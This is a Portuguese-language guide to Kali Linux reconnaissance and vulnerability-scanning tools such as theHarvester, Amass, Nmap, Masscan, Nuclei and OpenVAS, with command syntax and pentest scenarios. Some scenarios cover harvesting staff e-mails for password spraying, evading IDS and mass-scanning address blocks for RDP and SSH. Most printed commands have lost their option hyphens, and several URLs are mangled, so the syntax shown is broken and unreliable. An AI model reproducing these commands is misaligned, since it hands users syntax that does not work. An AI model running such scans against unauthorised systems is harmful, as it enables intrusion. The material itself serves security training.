GUIA CIBERSEGURANÇA

Este documento constitui um referencial técnico e acadêmico para a exploração sistemática do ecossistema Kali Linux. Seu objetivo principal é documentar, de forma estruturada e progressiva, o ferramental aplicado em auditorias de cibersegurança, gestão de infraestrutura de TI e integração de práticas DevSecOps.

Fundamentado em metodologias padrão da indústria, como o *Penetration Testing Execution Standard* (PTES) e a *Cyber Kill Chain*, este guia categoriza as aplicações em conformidade com o ciclo de vida do *pentest* — evoluindo do mapeamento inicial da superfície de ataque (OSINT) até a automação contínua de segurança em *pipelines* CI/CD. O escopo prioriza estritamente a precisão técnica, detalhando a operação de baixo nível, a sintaxe fundamentada e a execução prática de cada ferramenta em cenários éticos e profissionais.

# **1  Reconhecimento Passivo e OSINT:**

Coleta de informações em fontes abertas e inteligência de ameaças sem interação direta com a infraestrutura do alvo.

## **1.1 TheHarvester**

- **Descrição Acadêmica/Técnica:** O theHarvester é um *script* desenvolvido em Python projetado para a automação da coleta de dados de inteligência em fontes abertas. Operando em nível de aplicação (Camada 7 do modelo OSI), ele realiza requisições iterativas a motores de busca públicos, servidores de chaves PGP e APIs de terceiros (como Shodan, Hunter.io, e DNSdumpster) para compilar metadados associados a um domínio alvo. A arquitetura da ferramenta minimiza o tráfego de rede direto contra a infraestrutura do alvo, caracterizando-se primariamente como uma técnica de reconhecimento passivo, mitigando a probabilidade de detecção por sistemas de prevenção de intrusão (IPS).  
- **Principais Funcionalidades:**  
  - Extração passiva de subdomínios, endereços IPv4/IPv6 e URLs associadas ao domínio.  
  - Identificação e coleta de endereços de e-mail corporativo expostos na web.  
  - Integração modular com APIs de *Threat Intelligence* para expansão do vetor de dados.  
  - Geração de relatórios estruturados (XML, HTML) para integração com outras ferramentas na esteira de testes.

**Sintaxe e Comandos Principais:**  
**Bash**  
 Sintaxe básica para pesquisa passiva  
theHarvester d dominio.com b fonteouall l limitederesultados

 Sintaxe para execução abrangente com exportação de dados  
theHarvester d dominio.com b all l 500 f nomedoarquivodesaida

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Em um engajamento de *Penetration Testing* modalidade *Black Box* contra a organização "alvo.com", o analista necessita mapear a superfície de ataque externa e identificar um padrão de nomenclatura de e-mails corporativos (ex: *[nome.sobrenome@alvo.com](mailto:nome.sobrenome@alvo.com)*). O objetivo é alimentar uma futura campanha de *password spraying* ou engenharia social, sem disparar alertas nos *firewalls* da organização.

**Comando Executado:**  
**Bash**  
theHarvester d alvo.com b all l 500 f reconalvoinicial

- **Resultado Esperado:** O comando consultará todas as fontes públicas disponíveis (all), limitando a busca a 500 resultados por fonte de pesquisa, e salvará a saída estruturada nos formatos HTML e XML no arquivo reconalvoinicial, contendo os e-mails e subdomínios vinculados a "alvo.com".



## **1.2 Recon-ng**

- **Descrição Acadêmica/Técnica:** O recon-ng é um framework de reconhecimento web completo, desenvolvido em Python, que adota uma arquitetura modular análoga ao Metasploit. Diferente de scripts isolados, ele utiliza uma base de dados SQLite estruturada para armazenar hosts, contatos, localizações e vulnerabilidades, permitindo a correlação de dados entre diferentes módulos. O sistema opera através de uma interface de linha de comando (CLI) que gerencia workspaces, garantindo a segregação de dados entre diferentes projetos de auditoria. Sua extensibilidade via APIs de terceiros permite a automação de consultas complexas e o processamento de grandes volumes de dados de inteligência sem interação direta com o alvo.  
- **Principais Funcionalidades:**  
  - Arquitetura modular dividida em: *Discovery*, *Exploitation*, *Import*, *Recon* e *Reporting*.  
  - Gestão de inventário técnico através de tabelas em banco de dados interno.  
  - Sistema de *Marketplace* para instalação e atualização dinâmica de módulos.  
  - Normalização de dados provenientes de múltiplas fontes OSINT.

**Sintaxe e Comandos Principais:**  
**Bash**  
 Inicialização do framework

recon-ng

 Gerenciamento de espaços de trabalho (workspaces)

workspaces create nomedoprojeto

workspaces list

 Instalação e carregamento de módulos via Marketplace

marketplace install modulo

modules load modulo

 Configuração de chaves de API (ex: Shodan, Virustotal)

keys add nomedaapi valordachave

 Execução de fluxo de trabalho (exemplo: busca de hosts)

info               Exibe opções do módulo carregado

options set SOURCE alvo.com

run

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Durante a fase de reconhecimento de uma infraestrutura baseada em nuvem, é necessário identificar todos os subdomínios de uma organização e verificar se algum está associado a serviços de armazenamento expostos. O analista utiliza o recon-ng para centralizar as descobertas em um único banco de dados, facilitando a exportação posterior para ferramentas de análise de vulnerabilidades.

**Comandos Executados:**  
**Bash**  
recon-ng

workspaces create auditorianuvem

marketplace install recon/domains-hosts/brutehosts

modules load recon/domains-hosts/brutehosts

options set SOURCE alvo.com

run

show hosts

- **Resultado Esperado:** O framework realizará ataques de força bruta no DNS (via dicionário) para identificar hosts ativos. Os resultados (nomes de host e endereços IP) serão automaticamente inseridos na tabela `hosts` do banco de dados do workspace `auditoria_nuvem`, prontos para serem utilizados por outros módulos de geolocalização ou busca de e-mails.



## **1.3 OWASP Amass**

- **Descrição Acadêmica/Técnica:** O OWASP Amass é uma ferramenta desenvolvida em linguagem Go, arquitetada para o mapeamento profundo da superfície de ataque e descoberta de ativos em redes externas. Diferente de *scripts* de enumeração simples, o Amass estrutura os dados coletados utilizando um banco de dados de grafos, o que permite a análise relacional entre domínios, endereços IP e provedores de hospedagem. Em baixo nível, a ferramenta implementa técnicas heurísticas, incluindo consultas a dezenas de APIs de *Threat Intelligence*, *scraping* de mecanismos de busca, análise de *Certificate Transparency* (CT Logs), resolução recursiva de DNS, detecção de *wildcards* e permutações de nomes para inferir a existência de infraestruturas não documentadas.  
- **Principais Funcionalidades:**  
  - Mapeamento de organizações através de *Autonomous System Numbers* (ASN) e blocos CIDR.  
  - Execução de enumeração ativa (resolução e força bruta DNS) e passiva (coleta de terceiros sem tocar no alvo).  
  - Identificação de *subdomain takeover* e validação estrutural de apontamentos de DNS.  
  - *Tracking* contínuo da infraestrutura, permitindo identificar diferenças (*diffing*) e novos ativos entre ciclos de execução.  
  - Integração para exportação de malhas visuais e topologia para ferramentas como Maltego.

**Sintaxe e Comandos Principais:**  
**Bash**  
 Enumeração estritamente passiva (sem envio de pacotes ao alvo direto)  
amass enum passive d dominio.com

 Enumeração ativa com força bruta de DNS, resolução de IPs e exibição da fonte de origem  
amass enum active d dominio.com brute ip src

 Coleta de inteligência corporativa buscando domínios associados a um ASN específico  
amass intel asn NUMEROASN

 Identificação de novos ativos em relação a varreduras anteriores (tracking histórico)  
amass track d dominio.com

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Em um ciclo de auditoria contínua integrada a uma esteira DevSecOps, o objetivo é mapear exaustivamente a infraestrutura da organização "alvo.com". O escopo (*White Box*) permite interação direta, e o analista necessita descobrir subdomínios subjacentes, resolver seus IPs correspondentes e armazenar a saída em um diretório específico para alimentar *pipelines* subsequentes de varredura de portas (ex: Nmap).

**Comando Executado:**  
**Bash**  
amass enum active d alvo.com brute ip dir ./reconamassalvo

- **Resultado Esperado:** O Amass acionará resoluções de DNS com listas de permutações e força bruta, consultará *logs* de transparência de certificados e APIs, armazenando a topologia resultante estruturada (incluindo o banco em formato JSON e *logs* de texto) dentro do diretório ./reconamassalvo.



## **1.4 Maltego**

- **Descrição Acadêmica/Técnica:** O Maltego é uma plataforma de mineração de dados e análise de vínculos (*link analysis*), desenvolvida em Java, com arquitetura primariamente orientada a uma interface gráfica de grafos relacionais. Sua operação ocorre por meio de entidades (nós) que são submetidas a "transformações" (*transforms*). Em baixo nível, um *transform* é um código (frequentemente em Python) executado localmente ou em servidores de terceiros (TAS  *Transform Application Server*), encarregado de realizar consultas estruturadas via APIs a bases de dados públicas e privadas (ex: registros WHOIS, Shodan, redes sociais e inteligência de ameaças). O retorno de dados em formato XML é instantaneamente renderizado em um grafo direcionado, permitindo ao analista correlacionar dezenas de milhares de artefatos de infraestrutura de TI, e identificar interdependências ocultas durante a modelagem de ameaças.
- **Principais Funcionalidades:**  
  - Mapeamento visual e interativo de topologias de rede, domínios, *Autonomous Systems* (ASNs) e relações de confiança.  
  - Execução paralela de coletas OSINT a partir de um único ponto de dados (semente).  
  - Extensibilidade massiva via *Maltego Transform Hub* (integração com VirusTotal, AlienVault OTX, MITRE ATTCK, entre outros).  
  - Agrupamento hierárquico e análise estatística de grandes volumes de entidades para identificação de padrões.

**Sintaxe e Comandos Principais:** Apesar de sua natureza inerentemente gráfica, o fluxo de inicialização e o desenvolvimento de módulos customizados (*transforms*) em sistemas *Unix-like* podem ser manipulados via terminal:  
**Bash**  
 Inicialização do processo principal da interface gráfica

maltego

 Criação de um projeto base para desenvolvimento de transforms customizados em Python

maltego-trx start nomedoprojeto

 Execução local de um transform customizado para validação de saída

python3 project.py local nomedotransform valordaentidade

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Durante o reconhecimento de um domínio corporativo de uma organização, a equipe de cibersegurança necessita correlacionar a infraestrutura pública com possíveis credenciais vazadas e identificar relações societárias expostas que possam servir como vetores para campanhas de *phishing* ou comprometimento de contas (*Account Takeover*).  
  - **Execução Prática:** O analista insere a entidade Domain com o valor "alvo.com" no centro do grafo. Em seguida, seleciona o nó e executa simultaneamente as transformações To Email address theHarvester e To DNS Name Find sub-domains. Selecionando as entidades de e-mail resultantes, executa o *transform* To Breach Have I Been Pwned.
  - **Resultado Esperado:** O sistema renderizará uma árvore visual ramificando o domínio primário em diversos subdomínios e endereços de e-mail funcionais. Adicionalmente, conectará os e-mails a nós que representam incidentes de vazamento de dados documentados (com datas e tipos de dados expostos), fornecendo insumos empíricos e imediatos para a continuidade da auditoria de segurança.



## **1.5 SpiderFoot**

- **Descrição Acadêmica/Técnica:** O SpiderFoot é uma ferramenta de automação de inteligência de fontes abertas (OSINT) desenvolvida em Python, projetada para integrar e correlacionar dados de mais de 200 fontes distintas. Sua arquitetura é orientada a eventos e baseada em módulos: cada dado coletado (ex: um endereço IP) é tratado como um evento que pode disparar automaticamente outros módulos (ex: geolocalização ou verificação de *reputation*). Em baixo nível, a ferramenta gerencia requisições assíncronas para APIs de terceiros e realiza *web scraping* para compilar um grafo de informações sobre domínios, sub-redes, e-mails e nomes de usuário, minimizando o esforço manual de correlação de dados brutos.  
- **Principais Funcionalidades:**  
  - Execução de varreduras recursivas que automatizam o fluxo de descoberta de ativos.  
  - Integração nativa com APIs de *Threat Intelligence* (Shodan, Censys, VirusTotal, etc.).  
  - Interface web (GUI) integrada para visualização de gráficos de relacionamentos e tabelas de dados.  
  - Capacidade de monitoramento contínuo para detecção de alterações na superfície de ataque.

**Sintaxe e Comandos Principais:**  
**Bash**  
 Inicialização do servidor para acesso via interface gráfica (padrão: 127.0.0.1:5001)

spiderfoot l 127.0.0.1:5001

 Execução via CLI: listar todos os módulos de coleta disponíveis

spiderfoot m

 Iniciar um scan via CLI em um alvo específico com módulos selecionados e saída em CSV

spiderfoot s alvo.com m s3bucket,whois,googlemaps o csv  resultadosrecon.csv

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Um analista de infraestrutura precisa identificar buckets S3 da Amazon Web Services (AWS) que possam estar associados ao domínio "alvo.com" e verificar se há exposição de dados sensíveis ou arquivos de configuração críticos.  
  - **Execução Prática:** O analista inicia o SpiderFoot, seleciona o alvo e ativa especificamente o módulo s3bucket.  
  - **Resultado Esperado:** O SpiderFoot realizará buscas exaustivas por nomes de buckets que sigam o padrão do domínio alvo. Caso identificados, o analista poderá verificar se o acesso público está habilitado, prevenindo um potencial vazamento de dados antes que seja explorado por agentes maliciosos.



# **2  Enumeração Ativa e Mapeamento de Rede.**

Diferente do reconhecimento passivo, esta fase exige interação direta com a infraestrutura do alvo. O objetivo é enviar pacotes de rede forjados e analisar as respostas para mapear a topologia, identificar *hosts* vivos, determinar o estado de portas (abertas, fechadas, filtradas por *firewalls*) e realizar o *fingerprinting* de serviços e sistemas operacionais.

## **2.1 Nmap (Network Mapper)**

- **Descrição Acadêmica/Técnica:** Nmap é um utilitário de código aberto para exploração de rede e auditoria de segurança. Em baixo nível, opera manipulando *sockets* brutos (*Raw Sockets*) para forjar pacotes customizados nas camadas 3 (Rede) e 4 (Transporte) do modelo OSI. Através da análise determinística e probabilística dos pacotes de resposta (como *flags* TCP SYN/ACK/RST, mensagens ICMP e peculiaridades do *Initial Sequence Number*  ISN), a ferramenta infere o estado das portas e a identidade do *stack* TCP/IP do alvo. Além do mapeamento, o Nmap integra um motor de execução (NSE  *Nmap Scripting Engine*) baseado na linguagem Lua, expandindo sua capacidade para auditoria automatizada e detecção de vulnerabilidades (*CVEs*).  
- **Principais Funcionalidades:**  
  - Descoberta de *hosts* (*Host Discovery/Ping Sweep*) via requisições ICMP, TCP e ARP.  
  - Execução de múltiplos algoritmos de varredura (TCP SYN *Stealth*, TCP Connect, UDP, XMAS, FIN, ACK).  
  - Extração de *banners* e análise de comportamento para detecção precisa da versão de *daemons* em execução (-sV).  
  - Motor NSE com centenas de *scripts* categorizados (ex: *default, vuln, safe, intrusive*).  
  - Controle granular de *timing*, fragmentação de pacotes e MTU para evasão de *Firewalls* e IDS/IPS.

**Sintaxe e Comandos Principais:**  
**Bash**  
 Varredura de descobrimento de rede (Ping Sweep via ARP/ICMP) sem port scan

nmap sn 192.168.1.0/24

 Varredura TCP SYN furtiva padrão (requer privilégios de root)

sudo nmap sS alvoouIP

 Varredura Agressiva (Detecção de SO, Versões, Scripting padrão e Traceroute)

sudo nmap A alvoouIP

 Varredura completa (65535 portas), extração de versões e exportação de relatórios

sudo nmap sS p- sV alvoouIP oA nomedoarquivosaida

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Durante um engajamento de *Internal Pentest*, o analista obteve acesso à VLAN corporativa interna de servidores (10.0.5.0/24). A prioridade é mapear rapidamente todos os *hosts* vivos, descobrir todas as portas TCP abertas e identificar as versões exatas dos serviços para posterior pesquisa de *exploits* no Metasploit, garantindo que os artefatos fiquem salvos para documentação.

**Comando Executado:**  
**Bash**  
sudo nmap sS p- sV O -min-rate 1000 10.0.5.0/24 oA reconinternavlan5

- **Resultado Esperado:** O comando enviará pacotes SYN massivos de forma assíncrona (garantindo o envio mínimo de 1000 pacotes por segundo via -min-rate) para todas as 65.535 portas (-p-) de cada IP vivo na sub-rede. Ele aplicará assinaturas para descobrir o Sistema Operacional (-O) e as versões dos serviços (-sV). O resultado será exportado em três formatos distintos (XML, formato Nmap e formato *Grepable*) utilizando o prefixo reconinternavlan5, facilitando a integração contínua na esteira de auditoria.



## **2.2 Masscan**

- **Descrição Acadêmica/Técnica:** O Masscan é um *scanner* de portas TCP/UDP assíncrono arquitetado para varreduras de escopo global (ex: mapeamento de todo o espaço de endereçamento IPv4). Diferente do Nmap, que interage com a pilha TCP/IP do *kernel* do sistema operacional e aloca recursos para gerenciar o estado de cada conexão, o Masscan implementa sua própria micro-pilha TCP/IP em espaço de usuário (*user-space*). Operando de forma estritamente assíncrona via *raw sockets* (e suportando *drivers* de captura otimizados como o PFRING), ele separa as *threads* de transmissão e recepção. Isso permite o envio ininterrupto de pacotes SYN e o processamento reativo de respostas SYN/ACK de forma independente, atingindo taxas teóricas de até 10 milhões de pacotes por segundo.  
- **Principais Funcionalidades:**  
  - Transmissão assíncrona de alto desempenho com *bypass* da pilha de rede do *kernel*.  
  - Controle restrito e granular da banda utilizada via limitação exata de pacotes por segundo (--rate).  
  - Compatibilidade intencional com a sintaxe de comandos e formatos de saída do Nmap (XML, Grepable, JSON).  
  - Suporte à captura de *banners* de serviços em escala de rede.
  - Capacidade de interrupção (pausa) e retomada de varreduras de longa duração, gerando e lendo arquivos de estado de execução.

**Sintaxe e Comandos Principais:**  
**Bash**  
 Varredura de uma porta específica em um bloco de rede definindo a taxa (ex: 10.000 pacotes/segundo)

sudo masscan pporta blocoIPouCIDR -rate=numerodepacotes

 Varredura das portas mais comuns em múltiplos blocos, com exportação no formato Grepable

sudo masscan -top-ports 100 10.0.0.0/8 192.168.0.0/16 -rate=100000 oG arquivo.grep

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Durante um engajamento de *Red Teaming* ou análise de superfície de ataque externa de um grande provedor de serviços, o analista recebe um escopo abrangendo um bloco de endereços /16 (65.536 IPs). O objetivo primário e imediato é identificar todos os *hosts* que possuem serviços de administração remota expostos para a internet (RDP  3389 e SSH  22), operando em velocidade máxima antes de aplicar varreduras de vulnerabilidades mais lentas (via Nmap).

**Comando Executado:**  
**Bash**  
sudo masscan p22,3389 203.0.113.0/16 -rate=50000 oG reconmassivoadmin.grep

- **Resultado Esperado:** O Masscan processará todos os endereços do bloco /16 focado estritamente nas portas 22 e 3389, transmitindo a uma taxa constante de 50.000 pacotes por segundo. A execução será concluída em poucos segundos. Os IPs que responderem positivamente terão seus registros (IP e porta aberta) salvos no arquivo reconmassivoadmin.grep, fornecendo uma sub-lista de alvos refinada para a próxima etapa da auditoria.



## **2.3 Netdiscover**

- **Descrição Acadêmica/Técnica:** Operando exclusivamente na Camada 2 (Enlace de Dados) do modelo OSI, o Netdiscover é uma ferramenta projetada para a identificação de *hosts* vivos em redes locais (LANs) utilizando o protocolo ARP (*Address Resolution Protocol*). Diferente de varredores tradicionais que operam nas camadas 3 e 4 via ICMP ou TCP/UDP, o Netdiscover não depende de roteamento. Ele identifica ativos injetando requisições ARP no domínio de *broadcast* (modo ativo) ou interceptando tráfego ARP preexistente (modo passivo). Como o tráfego ARP é fundamental para a comunicação em rede local e raramente filtrado por *firewalls* de *host* (como o Windows Defender Firewall), o Netdiscover é altamente eficaz para mapear ativos antes da execução de varreduras de portas em camadas superiores.  
- **Principais Funcionalidades:**  
  - Operação bidirecional: Mapeamento ativo (injeção de *requests*) e reconhecimento estritamente passivo (escuta de *promiscuous mode*).  
  - Resolução automática de *Organizationally Unique Identifier* (OUI) para identificar os fabricantes das placas de rede (ex: Cisco, VMware, Apple), auxiliando no *fingerprinting* inicial de dispositivos (ex: impressoras vs. *hypervisors*).  
  - Modificação de endereços MAC de origem (MAC *spoofing* nativo) durante requisições ativas para dificultar o rastreamento em sistemas de detecção de intrusão (NIDS).

**Sintaxe e Comandos Principais:**  
**Bash**  
 Varredura ativa em uma sub-rede específica (requer privilégios de root)

sudo netdiscover r blocoIPouCIDR

 Varredura ativa especificando a interface de rede (ex: eth0 ou wlan0)

sudo netdiscover i interface r blocoIPouCIDR

 Modo de escuta passiva (não envia pacotes, apenas analisa o tráfego ARP local)

sudo netdiscover p i interface

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Em um engajamento de *Physical Penetration Testing* ou após comprometer um dispositivo na rede interna (ex: via *pivot* de uma máquina Windows), o analista precisa mapear os *hosts* da VLAN corporativa 192.168.10.0/24. O ambiente possui um IDS rigoroso (*Intrusion Detection System*) que bloqueia varreduras ICMP/TCP de imediato. A prioridade é obter uma lista silenciosa de endereços IP e MACs vivos antes de lançar ataques direcionados.

**Comando Executado:**  
**Bash**  
sudo netdiscover p i eth0

- **Resultado Esperado:** A placa de rede eth0 entrará em modo promíscuo, escutando passivamente os anúncios ARP pela rede sem transmitir um único pacote. A ferramenta construirá em tempo real uma tabela contendo os IPs, endereços MAC associados e o fabricante do *hardware* de cada *host* ativo na rede que esteja transmitindo dados.



## **2.4 Legion**

- **Descrição Acadêmica/Técnica:** O Legion é um *framework* de *penetration testing* semi-automatizado, com interface gráfica desenvolvida em Python (via PyQt), que atua como um orquestrador para diversas ferramentas subjacentes de varredura e exploração (como Nmap, Masscan, Nikto, Dirb, Enum4linux e Hydra). Sua arquitetura baseia-se em execução sensível ao contexto (*context-aware automation*): ao identificar um serviço específico em uma porta (ex: HTTP na porta 80), o *framework* dinamicamente sugere e automatiza a execução de *scripts* e varreduras direcionadas exclusivamente àquele protocolo. Em baixo nível, ele abstrai a sintaxe complexa de múltiplos utilitários de linha de comando, estruturando os retornos padrão (*stdout/stderr*) em um banco de dados relacional local (SQLite) para centralização de evidências e gerenciamento de estado do projeto.  
- **Principais Funcionalidades:**  
  - Interface gráfica interativa para visualização em árvore de *hosts*, portas, serviços e vulnerabilidades.  
  - Execução modular e encadeada de ferramentas baseada em assinaturas de serviços descobertos.  
  - Parametrização ajustável para intensidade de varredura (*Easy*, *Hard*, *Custom*), mitigando riscos de interrupção de serviços (*Denial of Service* acidental).  
  - Centralização de *logs* de terminal e captura automática de artefatos para geração de relatórios de auditoria.
- **Sintaxe e Comandos Principais:** Sendo uma aplicação estritamente gráfica, a interação via CLI é limitada à inicialização com privilégios elevados para garantir o funcionamento adequado dos manipuladores de rede (*raw sockets*) do Nmap e Masscan.  
**Bash**

 Inicialização do framework (requer privilégios de root para varreduras furtivas e de SO)

sudo legion

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Um auditor de segurança recebe um escopo de 50 servidores corporativos mesclados (Windows e Linux). Para otimizar o tempo de *assessment* e evitar a digitação manual de dezenas de comandos para cada serviço descoberto (ex: mapeamento SMB, *fuzzing* web, tentativas de login anônimo via FTP), ele opta por uma abordagem orquestrada que centralize os dados para facilitar a escrita do relatório final.  
  - **Execução Prática:** O analista abre o terminal e executa sudo legion. Na interface gráfica, adiciona a sub-rede 10.0.10.0/24 ao escopo e inicia uma varredura padrão.  
  - **Resultado Esperado:** O Legion executará o Nmap em *background*. Assim que descobrir, por exemplo, a porta 445 aberta em um *host*, ele automaticamente ativará *scripts* NSE do Nmap para enumeração de SMB e rodará o enum4linux contra aquele IP específico. O analista poderá navegar pela GUI e clicar no *host* para ler os resultados estruturados de todas essas ferramentas simultaneamente em um único painel.



# **3- Análise de Vulnerabilidades**

Nesta fase do ciclo de auditoria, o foco transita do mapeamento topológico para a identificação ativa e triagem de falhas de segurança. O objetivo é correlacionar os serviços e versões descobertos na fase anterior com bancos de dados de vulnerabilidades conhecidas (CVEs), além de auditar configurações sistêmicas (misconfigurations) e credenciais padrão.

## **3.1 Nuclei**

- **Descrição Acadêmica/Técnica:** Desenvolvido em linguagem Go pela ProjectDiscovery, o Nuclei é um motor de varredura de vulnerabilidades arquitetado sobre um modelo de execução declarativo baseado em *templates* YAML. Diferente de *scanners* tradicionais que operam primariamente via *banner grabbing* ou heurísticas fechadas, o Nuclei executa requisições HTTP, TCP, DNS e SSL exatas e customizadas, analisando as respostas contra padrões de expressões regulares (RegEx) ou *matchers* lógicos definidos pela comunidade. Essa abordagem de baixo nível (enviando o *payload* exato da exploração) reduz drasticamente a taxa de falsos positivos. Devido à sua altíssima concorrência e capacidade de saída em formatos estruturados (JSON), é amplamente adotado em *pipelines* de Integração e Entrega Contínuas (CI/CD) para testes de regressão de segurança.  
- **Principais Funcionalidades:**  
  - Execução massiva e concorrente de verificações de segurança em múltiplos alvos simultaneamente.  
  - Motor de *templates* flexível (YAML) que permite a rápida tradução de *Proof of Concepts* (PoCs) de novas CVEs em automações de detecção.  
  - Suporte a múltiplos protocolos (TCP, HTTP, DNS, SSL, File, Whois, entre outros).  
  - Filtros granulares de execução baseados em *tags*, severidade, autores ou diretórios específicos.
- **Sintaxe e Comandos Principais:**  
**Bash**

 Atualização do motor de templates oficial da comunidade (recomendado antes de qualquer uso)

nuclei ut

 Varredura básica de um único alvo utilizando todos os templates padrão

nuclei u [https://alvo.com\]](https://alvo.com\])

 Varredura massiva a partir de um arquivo de IPs/Domínios exportando os resultados para JSON

nuclei l hosts.txt json-export resultados.json

 Varredura focada estritamente em vulnerabilidades críticas e altas (CVEs e exposições)

nuclei u alvo.com tags cve,exposure severity critical,high

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** No contexto de uma esteira DevSecOps, um novo *deploy* de uma aplicação web (*release candidate*) acaba de ser provisionado no ambiente de *staging* ([https://staging.alvo.com\](https://staging.alvo.com)](https://staging.alvo.com\](https://staging.alvo.com))). Antes de promover o código para produção, o analista automatiza o Nuclei no *pipeline* para garantir que não haja arquivos de ambiente expostos (como .env ou .git) e que a aplicação não esteja vulnerável a falhas críticas recém-descobertas.  
  - **Comando Executado:**  
  **Bash**

nuclei u [https://staging.alvo.com](https://staging.alvo.com) tags config,cve severity critical,high,medium o relatorionucleistaging.txt

- **Resultado Esperado:** O Nuclei compilará os *templates* que correspondam às *tags* e severidades solicitadas e disparará requisições simultâneas contra o ambiente de *staging*. Caso encontre, por exemplo, um diretório .git exposto ou um painel de administração vulnerável a uma CVE específica, a correspondência será validada (evitando falsos positivos) e registrada no arquivo relatorionucleistaging.txt, podendo acionar o bloqueio automático do *deploy* na esteira de CI/CD.



## **3.2 Nessus**

- **Descrição Acadêmica/Técnica:** O Nessus, desenvolvido pela Tenable, é uma solução proprietária de varredura de vulnerabilidades amplamente consolidada como padrão na indústria corporativa. Em baixo nível, opera de forma arquiteturalmente análoga ao OpenVAS (que derivou de seu código *open-source* original), utilizando um motor que executa dezenas de milhares de *plugins* compilados, escritos na linguagem NASL (*Nessus Attack Scripting Language*). Sua distinção técnica principal reside na curadoria estrita e na telemetria global de suas assinaturas, o que lhe confere um índice de falsos positivos significativamente menor que as alternativas gratuitas. A ferramenta é projetada não apenas para inferência probabilística de CVEs via rede, mas fundamentalmente para a auditoria determinística do estado interno do sistema operacional.  
- **Principais Funcionalidades:**  
  - Execução de varreduras autenticadas (*Credentialed Scans*) de altíssima precisão no registro do Windows e sistemas de arquivos Linux.  
  - Auditoria nativa de conformidade baseada em *benchmarks* rigorosos (CIS, DISA STIG, HIPAA, PCI-DSS).  
  - Avaliação de segurança em dispositivos de infraestrutura de rede (switches, roteadores Cisco/Juniper) e *appliances* de segurança.  
  - Geração de relatórios executivos com priorização baseada em risco (*Vulnerability Priority Rating*  VPR).
- **Sintaxe e Comandos Principais:** Sendo uma plataforma *Enterprise* cuja operação interativa ocorre primariamente através de sua interface gráfica (GUI), a interação via terminal no Kali Linux restringe-se ao controle do *daemon* e manutenção do *backend*:  
**Bash**

 Inicialização do daemon do Nessus (acesso padrão: [https://127.0.0.1:8834](https://127.0.0.1:8834))

sudo systemctl start nessusd

 Habilitação do serviço para inicialização contínua junto ao boot do SO

sudo systemctl enable nessusd

 Atualização manual do banco de dados de plugins (útil para redes air-gapped)

sudo /opt/nessus/sbin/nessuscli update

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Uma instituição financeira necessita validar se a sua infraestrutura interna (10.50.0.0/24) está em estrita conformidade com as diretrizes do PCI-DSS antes de uma auditoria oficial externa. É imperativo atestar a ausência de protocolos legados (como SMBv1 ou Telnet), validar políticas de expiração de senhas e garantir o *patching* de 100% dos *hosts*. O uso de *exploits* é terminantemente proibido para evitar *downtime*.  
  - **Execução Prática:** O analista acessa a interface web no localhost, cria uma varredura utilizando o *template* "PCI-DSS Network Scan", insere as credenciais de um usuário com privilégios de leitura no domínio do *Active Directory* e define a sub-rede alvo.  
  - **Resultado Esperado:** O Nessus autenticará silenciosamente via SMB/WMI em cada servidor, lerá as chaves de registro e as políticas de grupo local. Ao concluir, entregará um relatório de auditoria segmentando falhas de *software* (CVEs pendentes) de violações de política (ex: ausência de bloqueio de conta após 5 tentativas falhas), exigidas pelo padrão PCI.



## **3.3 OpenVAS (Greenbone Vulnerability Management)**

- **Descrição Acadêmica/Técnica:** O OpenVAS (*Open Vulnerability Assessment System*) é um *framework* corporativo de código aberto destinado ao gerenciamento centralizado de vulnerabilidades. Em baixo nível, não consiste em um executável isolado, mas sim em uma arquitetura baseada em múltiplos serviços: um processo gerenciador (gvmd), um servidor web para a interface de usuário (gsad) e o motor de varredura subjacente (ospd-openvas). O motor processa rotinas de testes denominadas *Network Vulnerability Tests* (NVTs), que são rotinas específicas desenvolvidas na linguagem NASL (*Nessus Attack Scripting Language*). Diferentemente de *scanners* que realizam apenas *banner grabbing* (inferência passiva), o OpenVAS atua de forma determinística por meio de varreduras autenticadas. Ele interage com o sistema de arquivos local do alvo via protocolos de administração (SMB, SSH, WMI) para auditar diretamente chaves de registro, permissões de diretórios e níveis de *patching* do *kernel*.  
- **Principais Funcionalidades:**  
  - Execução de varreduras profundas e autenticadas (*Credentialed Scans*) para alta precisão e eliminação de falsos positivos.  
  - Auditoria de conformidade e configurações incorretas diretamente no sistema operacional do ativo.  
  - Atualização contínua do banco de dados de assinaturas (NVTs, SCAP e alertas CERT) via *Greenbone Community Feed* (GCF).  
  - Gerenciamento temporal das vulnerabilidades e geração de relatórios técnicos baseados nas métricas do *Common Vulnerability Scoring System* (CVSS).
- **Sintaxe e Comandos Principais:** A interação em terminal no Kali Linux é primariamente focada na gestão da infraestrutura da ferramenta, sendo a execução de varreduras conduzida pela interface web:  
**Bash**

 1 Sincronização mandatória dos feeds de inteligência (executada periodicamente)

sudo greenbone-feed-sync

 2 Inicialização dos daemons e do servidor web (acesso padrão: [https://127.0.0.1:9392](https://127.0.0.1:9392))

sudo gvm-start

 3 Execução de rotina de diagnóstico para validação da integridade da instalação

sudo gvm-check-setup

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Em um engajamento *White Box*, o analista necessita validar se um bloco de servidores Linux da DMZ (192.168.50.0/24) está vulnerável a falhas de escalonamento de privilégio local ou se possui bibliotecas do sistema desatualizadas (ex: OpenSSL vulnerável). O escopo exige evidências concretas, não apenas inferências baseadas em portas abertas.  
  - **Execução Prática:** O analista garante que os serviços estão ativos executando sudo gvm-start. No navegador corporativo, acessa [https://127.0.0.1:9392\](https://127.0.0.1:9392)](https://127.0.0.1:9392\](https://127.0.0.1:9392)). Navega até a seção de configurações e adiciona chaves SSH privadas no gerenciador de credenciais (*Credentials*). Em seguida, cria um escopo (*Target*) apontando para 192.168.50.0/24, associa a credencial SSH previamente cadastrada e inicia uma tarefa (*Task*) de varredura com o perfil "Full and fast".  
  - **Resultado Esperado:** O motor OSPd efetuará login SSH legítimo em cada máquina, rodará comandos locais (como consultas ao gerenciador de pacotes dpkg ou rpm) e validará o estado real do sistema. A interface web processará esses dados e disponibilizará um relatório em PDF ou XML pontuando os CVEs confirmados e os respectivos *links* de mitigação do fornecedor.



